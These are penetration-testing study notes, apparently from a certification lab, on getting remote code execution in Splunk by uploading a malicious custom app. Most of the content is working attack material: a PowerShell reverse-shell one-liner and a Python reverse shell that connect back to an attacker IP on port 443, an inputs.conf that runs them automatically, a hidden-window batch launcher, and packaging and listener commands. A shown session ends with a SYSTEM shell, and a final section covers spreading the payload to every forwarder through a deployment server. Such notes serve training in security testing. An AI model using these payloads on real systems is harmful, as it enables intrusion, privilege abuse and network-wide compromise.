# Attacking Splunk (CPTS Notes)

## Overview
Primary RCE method: create a **custom malicious Splunk application** that runs a reverse shell script (Python, PowerShell, Bash, or Batch), then upload/install it via the Splunk web interface. Splunk auto-enables uploaded apps, triggering the script.

---

## Method: Malicious Custom App (Abusing Built-In Functionality)

**Reference tool:** this [Splunk shell package] — `bin` directory has Python & PowerShell examples.

### Step 1: Build the App Directory Structure
```
junior-security-analyst@htb[/htb]$ tree splunk_shell/

splunk_shell/
├── bin       ← scripts to run
└── default   ← inputs.conf
```

### Step 2: Create the Reverse Shell Script

**Windows (PowerShell one-liner):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Linux (Python — rev.py):**
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

### Step 3: Configure `inputs.conf` (in `default/`)
Tells Splunk what to run, how often, and whether enabled:
```
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
- `interval` is always in **seconds**; the script won't run without it
- `disabled = 0` → app runs immediately on deployment

### Step 4: Create a Launcher `.bat` (Windows)
Needed to actually execute the PowerShell one-liner on deployment:
```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

### Step 5: Package the App
```
junior-security-analyst@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/
```
Resulting structure:
```
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/inputs.conf
```

### Step 6: Start a Listener (BEFORE uploading)
```
junior-security-analyst@htb[/htb]$ sudo nc -lnvp 443
```

### Step 7: Upload via Splunk Web UI
Navigate to:
```
https://10.129.201.50:8000/en-US/manager/search/apps/local
```
→ **Install app from file** → Browse to `.tar.gz`/`.spl` → **Upload**

> As soon as the app uploads, Splunk **automatically enables it**, triggering the scripted input and firing the reverse shell — **no further action needed**.

### Step 8: Catch the Shell
```
junior-security-analyst@htb[/htb]$ sudo nc -lnvp 443

connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145

PS C:\Windows\system32> whoami
nt authority\system

PS C:\Windows\system32> hostname
APP03
```

**Result: SYSTEM-level shell** — immediately valuable for:
- Credential hunting (registry, memory, filesystem)
- Lateral movement
- Initial AD enumeration if this is the first foothold

### Linux Target Notes
- Same process, but edit `rev.py` with your IP/port before packaging
- Upload process identical → reverse shell lands on your Netcat listener

## Bonus: Pivoting via Deployment Server

If the compromised Splunk host is a **deployment server**, you can push RCE to **every host running a Universal Forwarder**:

- Place the malicious app in:
```
$SPLUNK_HOME/etc/deployment-apps
```
- **Important caveat:** Universal Forwarders **do not ship with Python** (unlike full Splunk installs)
  - In Windows-heavy environments → must use a **PowerShell-based** reverse shell app instead of Python

---

## Key Takeaways
- Splunk's **scripted input** mechanism is the core abuse vector — any script type (Python/PowerShell/Bash/Batch) can be weaponized
- Apps **auto-enable on upload** — reverse shell fires immediately, no manual trigger needed
- Expect **SYSTEM/root** level access given Splunk's typical install privileges
- Compromising a **deployment server** can cascade RCE across every Universal Forwarder in the environment — massive blast radius
- Remember: **Universal Forwarders lack Python** — plan payload type accordingly
